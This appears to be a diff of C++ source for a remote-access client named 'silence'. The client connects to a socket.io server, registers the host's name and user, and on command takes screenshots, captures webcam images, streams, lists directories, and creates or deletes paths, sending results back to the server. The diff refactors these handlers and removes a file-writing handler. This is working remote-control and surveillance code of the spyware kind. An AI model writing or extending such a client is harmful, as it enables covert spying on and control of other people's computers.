@@ -1,6 +1,8 @@
 #include <Client.h>
 
 #define SIOSTR(str) sio::string_message::create(str)
+#define SIOBOOL(boolean) sio::bool_message::create(boolean)
+#define SIOBIN(bin) sio::binary_message::create(bin)
 
 namespace silence
 {
@@ -87,37 +89,30 @@ namespace silence
         using namespace std::placeholders;
         auto commandObject = data->get_map();
         std::string event = commandObject["event"]->get_string();
-        std::cout << event << std::endl;
 
         if (event == "greet")
-            launchEvent<void()>(std::bind(&Client::greetEvent, this));
+            greetEvent();
         else if (event == "start_stream")
-            launchEvent<void()>(std::bind(&Client::startStreamEvent, this));
+            launchEvent<void()>(std::bind(&Client::startStreamEvent, this)); // launch in new thread
         else if (event == "kill_stream")
-            launchEvent<void()>(std::bind(&Client::killStreamEvent, this));
+            killStreamEvent();
         else if (event == "screenshot")
-            launchEvent<void()>(std::bind(&Client::screenshotEvent, this));
+            screenshotEvent();
         else if (event == "webcamshot")
-            launchEvent<void()>(std::bind(&Client::webcamShotEvent, this));
+            webcamShotEvent();
         else if (event == "listdir")
-            launchEvent<void(const CommandObject &)>(
-                std::bind(&Client::listDirEvent, this, _1), commandObject);
+            listDirEvent(commandObject);
         else if (event == "mkdir")
-            launchEvent<void(const CommandObject &)>(
-                std::bind(&Client::mkDirEvent, this, _1), commandObject);
+            mkDirEvent(commandObject);
         else if (event == "remove")
-            launchEvent<void(const CommandObject &)>(
-                std::bind(&Client::removeEvent, this, _1), commandObject);
-        else if (event == "write_file")
-            launchEvent<void(const CommandObject &)>(
-                std::bind(&Client::writeFileEvent, this, _1), commandObject);
+            removeEvent(commandObject);
         else
             error(event, "Unknown event");
     }
 
     void Client::greetEvent()
     {
-        mSocket->emit("add client",
+        mSocket->emit("add_client",
                       createObject({{"hostname", SIOSTR("hostname")},
                                     {"username", SIOSTR("username")}}));
     }
@@ -127,8 +122,8 @@ namespace silence
         impl::Screenshot screen;
         cv::Mat image{screen.take()};
 
-        mSocket->emit("screenshot",
-                      impl::toBinaryString(image));
+        response("screenshot",
+                 SIOBIN(impl::toBinaryString(image)));
     }
 
     void Client::webcamShotEvent()
@@ -139,11 +134,12 @@ namespace silence
             cv::Mat image;
 
             camera.read(image);
-            mSocket->emit("webcamshot", impl::toBinaryString(image));
+            response("webcamshot",
+                     SIOBIN(impl::toBinaryString(image)));
         }
         catch (cv::Exception &)
         {
-            error("webcamshot", "No camera found!");
+            error("webcamshot", "No camera found");
         }
     }
 
@@ -153,12 +149,13 @@ namespace silence
 
         if (!mStreamRunning)
         {
-            error("kill stream", "Stream is already killed");
+            error("kill_stream", "Stream is not running");
             return;
         }
 
         mStreamRunning = false;
-        info("Successfully killed stream");
+        response("kill_stream",
+                 SIOBOOL(true));
     }
 
     void Client::startStreamEvent()
@@ -187,37 +184,19 @@ namespace silence
         for (const auto &entry : fs::directory_iterator(object.at("path")->get_string()))
             dirList->get_vector().push_back(sio::string_message::create(entry.path()));
 
-        mSocket->emit("directory", dirList);
+        response("listdir", dirList);
     }
 
     void Client::mkDirEvent(const CommandObject &object)
     {
-        sendResponse(fs::create_directories(object.at("path")->get_string()),
-                     "mkdir", "fs::create_directories failed",
-                     "Successfully created directory");
+        response("mkdir",
+                 SIOBOOL(fs::create_directories(object.at("path")->get_string())));
     }
 
     void Client::removeEvent(const CommandObject &object)
     {
-        sendResponse(fs::remove(object.at("path")->get_string()),
-                     "rmdir", "fs::remove failed",
-                     "Successfully deleted directory");
-    }
-
-    void Client::writeFileEvent(const CommandObject &object)
-    {
-        fs::path path = object.at("path")->get_string();
-        auto binaryContent = object.at("content")->get_binary();
-
-        std::ofstream file(path, std::ios::binary);
-        if (!file.is_open())
-        {
-            error("write file", "file.is_open() failed");
-            return;
-        }
-
-        file.write(binaryContent->data(), binaryContent->size());
-        info("Successfully written to file");
+        response("remove",
+                 SIOBOOL(fs::remove(object.at("path")->get_string())));
     }
 
     void Client::error(const std::string &event, const std::string &msg)
@@ -229,5 +208,11 @@ namespace silence
     void Client::info(const std::string &info)
     {
         mSocket->emit("info", createObject({{"msg", SIOSTR(info)}}));
+    }
+
+    void Client::response(const std::string &event, const sio::message::list &msg)
+    {
+        mSocket->emit("response", createObject({{"event", SIOSTR(event)},
+                                                {"data", msg[0]}}));
     }
 }
